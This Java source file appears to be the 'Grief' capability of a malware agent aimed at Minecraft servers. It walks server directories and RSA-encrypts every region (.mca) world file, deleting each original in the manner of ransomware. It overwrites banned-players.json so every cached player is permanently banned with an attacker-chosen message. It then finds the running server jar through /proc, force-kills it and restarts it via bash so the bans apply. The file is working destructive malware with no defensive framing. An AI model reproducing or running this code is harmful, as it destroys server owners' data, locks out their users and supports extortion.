package com.chebuya.minegriefagent.capabilities;

import javax.crypto.Cipher;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.*;

import static com.chebuya.minegriefagent.util.Filesystem.getFileExtension;
import static com.chebuya.minegriefagent.util.Filesystem.pathExistsInZip;
import static com.chebuya.minegriefagent.util.Logging.LOGGER;

public class Grief {
    public static void startGrief(String rootDirectory, String message, Boolean encrypt, byte[] publicKeyBytes) {

        File root = new File(rootDirectory);
        if (!root.exists() || !root.isDirectory()) {
            return;
        }

        Queue<File> queue = new ArrayDeque<>();
        queue.add(root);


        String userJson;
        Map<String, String> players;
        String banMessage;
        while (!queue.isEmpty()) {
            File currentDir = queue.poll();
            File[] files = currentDir.listFiles();

            if (files == null) {
                continue;
            }

            for (File file : files) {
                if (file.isDirectory()) {
                    queue.add(file);
                }

                if (encrypt && getFileExtension(file).equals("mca")) {
                    LOGGER.info("detected region file: " + file.getAbsolutePath());

                    X509EncodedKeySpec spec = new X509EncodedKeySpec(publicKeyBytes);
                    KeyFactory kf;
                    try {
                        kf = KeyFactory.getInstance("RSA");
                    } catch (NoSuchAlgorithmException e) {
                        LOGGER.warning("could not find requested algorithm");
                        continue;
                    }
                    PublicKey publicKey;
                    try {
                        publicKey = kf.generatePublic(spec);
                    } catch (InvalidKeySpecException e) {
                        LOGGER.warning("invalid key specification");
                        continue;
                    }

                    byte[] mcaBytes;
                    try {
                        mcaBytes = Files.readAllBytes(Paths.get(file.getAbsolutePath()));
                    } catch (IOException e) {
                        LOGGER.warning("unable to read mca file");
                        continue;
                    }


                    Cipher cipher;
                    try {
                        cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
                        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
                    } catch (Exception e) {
                        LOGGER.warning("could not create cipher: " + e.getMessage());
                        continue;
                    }

                    int blockSize = 245;

                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    for (int i = 0; i < mcaBytes.length; i += blockSize) {
                        int blockLength = Math.min(blockSize, mcaBytes.length - i);
                        byte[] block = new byte[blockLength];
                        System.arraycopy(mcaBytes, i, block, 0, blockLength);

                        try {
                            byte[] encryptedBlock = cipher.doFinal(block);
                            outputStream.write(encryptedBlock);
                        } catch (Exception e) {
                            LOGGER.warning("unable to encrypt file section: " + e.getMessage());
                            continue;
                        }
                    }

                    try {
                        Files.write(Paths.get(file.getAbsolutePath().replace(".mca", ".mca.enc")), outputStream.toByteArray());
                        file.delete();
                    } catch (IOException e) {
                       LOGGER.warning("unable to overwrite mca file: " + e.getMessage());
                    }
                } else if (file.getName().equals("usercache.json")) {

                    try {
                        userJson = new String(Files.readAllBytes(Paths.get(file.getAbsolutePath())));
                    } catch (IOException e) {
                       LOGGER.warning("could not read " + file.getAbsolutePath());
                       continue;
                    }


                    players = extractPlayers(userJson);
                    Path path = Paths.get(file.getAbsolutePath().replace("usercache.json", "banned-players.json"));

                    try {
                        Files.write(path, generateBanFile(players, message).getBytes());
                        LOGGER.info("banfile written to " + path.getFileName());
                    } catch (IOException e) {
                        LOGGER.warning("unable to write banfile at " + path.getFileName());
                        continue;
                    }

                    File directory = new File("/proc");

                    File[] contents = directory.listFiles();

                    if (contents == null) {
                        continue;
                    }


                    for (File item : contents) {
                        if (!(item.isDirectory() && isNumeric(item.getName()))) {
                            continue;
                        }

                        String cmdline;
                        try {
                            cmdline = new String(Files.readAllBytes(Paths.get(item.getAbsoluteFile() + "/cmdline"))).replace("\0", " ");
                        } catch (IOException e) {
                            continue;
                        }

                        if (!cmdline.contains(" -jar ")) {
                            continue;
                        }

                        String cwd;
                        try {
                            cwd = Files.readSymbolicLink(Paths.get(item.getAbsolutePath() + "/cwd")).toString();
                        } catch (IOException e) {
                            LOGGER.warning("unable to read symlink for " + item.getAbsolutePath() + "/cwd");
                            continue;
                        }

                        String jarFile = "";
                        for (String part : cmdline.split(" ")) {
                            if (part.contains(".jar")) {
                                jarFile = part;
                                break;
                            }
                        }

                        String jarPath;
                        if (jarFile.startsWith("/")) {
                            jarPath = jarFile;
                        } else {
                            jarPath = Paths.get(new File(cwd, jarFile).getAbsolutePath()).toString();
                        }

                        if (!pathExistsInZip(jarPath, "net/minecraft/bundler/Main$FileEntry.class")) {
                            continue;
                        }

                        LOGGER.info("detected minecraft jar " + jarPath);

                        String restartScript = "kill -9 " + item.getName() + "; (nohup " + cmdline + " &)";
                        LOGGER.info(restartScript);
                        try {
                            LOGGER.info(cwd);
                            Runtime.getRuntime().exec(new String[]{"bash", "-c", restartScript}, null, new File(cwd)).waitFor();
                            return;
                        } catch (IOException e) {
                            LOGGER.warning("IO error while executing restart command: " + e.getMessage());
                        } catch (InterruptedException e) {
                            LOGGER.warning("interupt error while executing restart command: " + e.getMessage());
                        }
                    }
                }
            }
        }
    }


    private static boolean isNumeric(String str) {
        if (str == null || str.isEmpty()) {
            return false;
        }
        try {
            Double.parseDouble(str);
            return true;
        } catch (NumberFormatException e) {
            return false;
        }
    }

    private static Map<String, String> extractPlayers(String jsonString) {
        Map<String, String> uuidNameMap = new HashMap<>();

        String trimmed = jsonString.trim();
        if (trimmed.startsWith("[")) {
            trimmed = trimmed.substring(1);
        }
        if (trimmed.endsWith("]")) {
            trimmed = trimmed.substring(0, trimmed.length() - 1);
        }

        String[] objects = trimmed.split("\\},\\{");

        for (String obj : objects) {
            obj = obj.replaceAll("[{}]", "");

            String[] pairs = obj.split(",");

            String name = null;
            String uuid = null;

            for (String pair : pairs) {
                if (pair.contains("\"name\":")) {
                    name = pair.split(":")[1].trim().replaceAll("\"", "");
                } else if (pair.contains("\"uuid\":")) {
                    uuid = pair.split(":")[1].trim().replaceAll("\"", "");
                }

                if (name != null && uuid != null) {
                    uuidNameMap.put(uuid, name);
                    break;
                }
            }
        }

        return uuidNameMap;
    }


    public static String generateBanFile(Map<String, String> playerMap, String banMessage) {
        List<String> jsonObjects = new ArrayList<>();

        for (Map.Entry<String, String> entry : playerMap.entrySet()) {
            StringBuilder jsonObject = new StringBuilder();
            jsonObject.append("{")
                    .append("\"uuid\": \"").append(entry.getKey()).append("\", ")
                    .append("\"name\": \"").append(entry.getValue()).append("\", ")
                    .append("\"created\": \"2023-07-27 09:35:17 +0200\", ")
                    .append("\"source\": \"Console\", ")
                    .append("\"expires\": \"forever\", ")
                    .append("\"reason\": \"" + banMessage + "\"")
                    .append("}");

            jsonObjects.add(jsonObject.toString());
        }

        return "[" + String.join(",", jsonObjects) + "]";
    }
}
